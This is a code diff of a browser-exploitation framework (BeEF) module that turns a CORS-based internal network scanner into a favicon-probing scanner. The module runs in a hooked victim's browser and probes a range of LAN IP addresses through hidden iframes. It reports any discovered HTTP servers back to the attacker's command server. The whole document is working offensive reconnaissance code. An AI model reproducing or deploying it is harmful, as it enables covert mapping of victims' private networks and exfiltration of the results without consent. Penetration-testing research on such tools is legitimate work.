@@ -7,14 +7,13 @@
 beef.execute(function() {
 
   var ips = new Array();
+  var proto = 'http';
   var ipRange = "<%= @ipRange %>";
+  var port   = "<%= @rport %>";
+  var timeout = "<%= @timeout %>";
+  var wait = "<%= @wait %>";
   var threads = "<%= @threads %>";
-  var wait = 2;
-
-  if(!beef.browser.hasCors()) {
-    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=Browser does not support CORS');
-    return;
-  }
+  var urls = new Array('/favicon.ico', '/favicon.png', '/images/favicon.ico', '/images/favicon.png');
 
   // set target IP addresses
   if (ipRange == 'common') {
@@ -50,10 +49,32 @@ beef.execute(function() {
     ipBounds   = ipRange.split('-');
     lowerBound = ipBounds[0].split('.')[3];
     upperBound = ipBounds[1].split('.')[3];
-    for (var i = lowerBound; i <= upperBound; i++){
+    for (i=lowerBound;i<=upperBound;i++){
       ipToTest = ipBounds[0].split('.')[0]+"."+ipBounds[0].split('.')[1]+"."+ipBounds[0].split('.')[2]+"."+i;
       ips.push(ipToTest);
     }
+  }
+
+  checkFavicon = function(proto, ip, port, uri) {
+    var img = new Image;
+    var dom = beef.dom.createInvisibleIframe();
+    beef.debug("[Favicon Scanner] Checking IP [" + ip + "] (" + proto + ")");
+    img.src = proto+"://"+ip+":"+port+uri;
+    img.onerror = function() { dom.removeChild(this); }
+    img.onload = function() {
+      beef.net.send('<%= @command_url %>', <%= @command_id %>,'proto='+proto+'&ip='+ip+'&port='+port+"&url="+escape(this.src));dom.removeChild(this);
+      beef.debug("[Favicon Scanner] Found HTTP Server [" + escape(this.src) + "]");
+    }
+    dom.appendChild(img);
+    // stop & remove iframe
+    setTimeout(function() {
+      if (dom.contentWindow.stop !== undefined) {
+        dom.contentWindow.stop();
+      } else if (dom.contentWindow.document.execCommand !== undefined) {
+        dom.contentWindow.document.execCommand("Stop", false);
+      }
+      document.body.removeChild(dom);
+    }, timeout*1000);
   }
 
   WorkerQueue = function(frequency) {
@@ -70,7 +91,7 @@ beef.execute(function() {
         clearInterval(timer);
         timer = null;
         var interval = (new Date).getTime() - start_scan;
-        beef.debug("[Cross-Origin Scanner] Worker queue is complete ["+interval+" ms]");
+        beef.debug("[Favicon Scanner] Worker queue is complete ["+interval+" ms]");
         return;
       }
     }
@@ -84,29 +105,19 @@ beef.execute(function() {
 
   }
 
-  beef.debug("[Cross-Origin Scanner] Starting CORS scan ("+ips.length+" URLs / "+threads+" workers)");
-
   // create worker queue
   var workers = new Array();
   for (w=0; w < threads; w++) {
     workers.push(new WorkerQueue(wait*1000));
   }
 
-  // send CORS request to each IP
-  var proto = 'http';
-  var port = 80;
-  for (var i=0; i < ips.length; i++) {
-    var worker = workers[i % threads];
-    var url = proto + '://' + ips[i] + ':' + port;
-    worker.queue('beef.net.cors.request(' +
-      '"GET", "'+url+'", "", function(response) {' +
-       'if (response != null && response["status"] != 0) {' +
-        'beef.debug("[Cross-Origin Scanner] Received response from '+url+': " + JSON.stringify(response));' +
-        'var title = response["body"].match("<title>(.*?)<\\/title>"); if (title != null) title = title[1];' +
-        'beef.net.send("<%= @command_url %>", <%= @command_id %>, "ip='+ips[i]+'&port='+port+'&status="+response["status"]+"&title="+title+"&response="+JSON.stringify(response));' +
-       '}' +
-      '});'
-    );
+  // for each favicon path
+  for (var u=0; u < urls.length; u++) {
+    var worker = workers[u % threads];
+    // for each LAN IP address
+    for (var i=0; i < ips.length; i++) {
+      worker.queue('checkFavicon("'+proto+'","'+ips[i]+'","'+port+'","'+urls[u]+'");');
+    }
   }
 
 });
